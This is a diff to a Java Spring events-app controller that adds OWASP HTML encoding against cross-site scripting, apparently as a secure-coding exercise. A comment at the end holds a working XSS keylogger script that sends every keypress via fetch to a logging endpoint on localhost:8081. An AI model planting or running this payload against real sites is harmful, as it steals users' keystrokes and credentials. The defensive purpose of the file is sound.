@@ -1,5 +1,6 @@
 package com.shadsluiter.eventsapp.controllers;
 
+import org.owasp.encoder.Encode;
 import org.springframework.beans.factory.annotation.Autowired;
 import org.springframework.stereotype.Controller;
 import org.springframework.ui.Model;
@@ -11,6 +12,8 @@ import com.shadsluiter.eventsapp.models.EventSearch;
 import com.shadsluiter.eventsapp.service.EventService;
 
 import jakarta.validation.Valid;
+
+import java.util.ArrayList;
 import java.util.List;
 
 @Controller
@@ -27,7 +30,9 @@ public class EventController {
     @GetMapping
     public String getAllEvents(Model model) {
         List<EventModel> events = eventService.findAll();
-        model.addAttribute("events", events);
+        List<EventModel> sEventModels = new ArrayList<>();
+        events.forEach(e -> sEventModels.add(encodeEvent(e)));
+        model.addAttribute("events", sEventModels);
         model.addAttribute("message", "Showing all events");
         model.addAttribute("pageTitle", "Events");
         return "events";
@@ -46,7 +51,7 @@ public class EventController {
             model.addAttribute("pageTitle", "Create Event");
             return "create-event";
         }
-        eventService.save(event);
+        eventService.save(encodeEvent(event));
         return "redirect:/events";
     }
 
@@ -59,14 +64,17 @@ public class EventController {
 
     @PostMapping("/edit/{id}")
     public String updateEvent(@PathVariable String id, @ModelAttribute EventModel event, Model model) {
-        EventModel updatedEvent = eventService.updateEvent(id, event);
+        String eID = Encode.forHtml(id);
+        
+        EventModel updatedEvent = eventService.updateEvent(eID, event);
         model.addAttribute("event", updatedEvent);
         return "redirect:/events";
     }
 
     @GetMapping("/delete/{id}")
     public String deleteEvent(@PathVariable String id) {
-        eventService.delete(id);
+        String s = Encode.forHtml(id);
+        eventService.delete(s);
         return "redirect:/events";
     }
 
@@ -82,10 +90,60 @@ public String search(@ModelAttribute @Valid EventSearch eventSearch, BindingResu
     if (result.hasErrors()) {
         return "searchForm";
     }
-    List<EventModel> events = eventService.findByDescription(eventSearch.getSearchString());
+    String s = encodeString(eventSearch.getSearchString());
+    List<EventModel> events = eventService.findByDescription(s);
     model.addAttribute("message", "Search results for " + eventSearch.getSearchString());
     model.addAttribute("events", events);
     return "events";
 }
 
+    private EventModel encodeEvent(EventModel event){
+        EventModel secure = new EventModel();
+
+        secure.setDescription(encodeString(event.getDescription()));
+        if(event.getId() != null)
+            secure.setId(encodeString(event.getId()));
+        secure.setLocation(encodeString(event.getLocation()));
+        secure.setName(encodeString(event.getName()));
+        secure.setOrganizerid(encodeString(event.getOrganizerid()));
+        secure.setDate(event.getDate());
+
+        return secure;
+    }
+
+    private String encodeString(String event){
+
+        return Encode.forHtml(event);
+    }
 }
+
+/*
+ * 
+<script>
+document.addEventListener('keypress', function(evt) {
+  var key = evt.key;  
+  if (key) {
+    var param = encodeURIComponent(key);
+    var url = "http://localhost:8081/logKey?key=" + param;
+
+    fetch(url, {
+      method: 'GET'
+    })
+    .then(response => {
+      if (!response.ok) {
+        throw new Error('Network response was not ok');
+      }
+      return response.text();
+    })
+    .then(data => {
+      console.log('Key logged:', data);
+    })
+    .catch(error => {
+      console.error('There was a problem with the fetch operation:', error);
+    });
+  }
+});
+
+</script>
+
+ */
